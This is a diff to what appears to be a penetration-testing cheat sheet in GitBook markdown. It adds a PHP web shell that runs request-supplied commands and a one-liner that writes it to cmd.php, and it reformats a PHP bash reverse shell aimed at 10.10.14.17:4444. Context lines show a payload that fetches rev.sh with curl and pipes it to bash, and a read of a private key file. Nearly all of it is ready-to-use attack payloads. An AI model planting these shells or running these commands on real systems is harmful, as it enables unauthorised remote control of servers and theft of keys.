@@ -85,6 +85,26 @@ echo file_get_contents("/home/nairobi/ca.key")
 ```
 {% endhint %}
 
+***
+
+{% hint style="warning" %}
+## Web Shells
+
+### <mark style="color:orange;">`PHP`</mark>
+
+{% code title="Standard shell" %}
+```php
+<?php system($_REQUEST['cmd']); ?>
+```
+{% endcode %}
+
+{% code title="Create cmd.php" %}
+```bash
+echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
+```
+{% endcode %}
+{% endhint %}
+
 
 
 
@@ -121,12 +141,6 @@ exec "/bin/sh"                # (From within IRB)
 
 ***
 
-{% hint style="danger" %}
-## Reverse Shells
-
-
-{% endhint %}
-
 
 
 HTTP
@@ -140,9 +154,7 @@ PHP
 
 ```bash
 #For index.php files
-<?php
-system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");
-?>
+<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");?>
 
 #To copy inside a file
 echo '<?php system("curl <http://10.10.14.16:443/rev.sh> | bash"); ?>' > hola.php
